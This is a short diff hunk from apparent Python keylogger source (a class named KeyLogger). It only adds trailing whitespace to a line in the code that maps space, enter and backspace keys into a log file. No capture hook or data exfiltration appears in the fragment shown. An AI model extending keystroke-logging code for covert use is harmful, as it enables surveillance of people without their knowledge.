@@ -19,7 +19,7 @@ class KeyLogger():
                 self.log_file.truncate()
             case "space": 
                 print_key = " "
-            case "enter":
+            case "enter":      
                 print_key = "\n"
             case "backspace":
                 self.log_file.seek(0)
